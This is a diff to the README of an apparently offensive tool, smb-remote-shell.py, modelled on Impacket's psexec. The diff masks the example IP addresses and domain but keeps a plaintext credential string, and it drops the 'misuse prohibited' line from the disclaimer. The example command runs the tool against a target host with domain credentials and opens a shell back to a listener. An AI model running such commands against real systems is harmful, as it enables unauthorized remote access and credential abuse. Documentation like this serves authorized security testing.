@@ -39,7 +39,7 @@ python smb-remote-shell.py <TARGET> <DOMAIN\USERNAME:PASSWORD> -i <LHOST> -p <LP
 ### Example
 
 ```sh
-python smb-remote-shell.py 192.168.98.120 child.warfare.corp\corpmngr:"User4&*&*" -i 192.168.80.10 -p 8124
+python smb-remote-shell.py 192.168.98.x ch.war.corp\corpmngr:"User4&*&*" -i 192.168.80.x -p 8124
 ```
 
 ### Arguments
@@ -69,7 +69,7 @@ python smb-remote-shell.py 192.168.98.120 child.warfare.corp\corpmngr:"User4&*&*
 
 ## Disclaimer
 
-This tool is intended for educational and authorized security testing purposes only. Misuse of this script is strictly prohibited.
+This tool is intended for educational and authorized security testing purposes only.
 
 \
 Reference  [https://github.com/fortra/impacket/blob/master/examples/psexec.py](https://github.com/fortra/impacket/blob/master/examples/psexec.py)
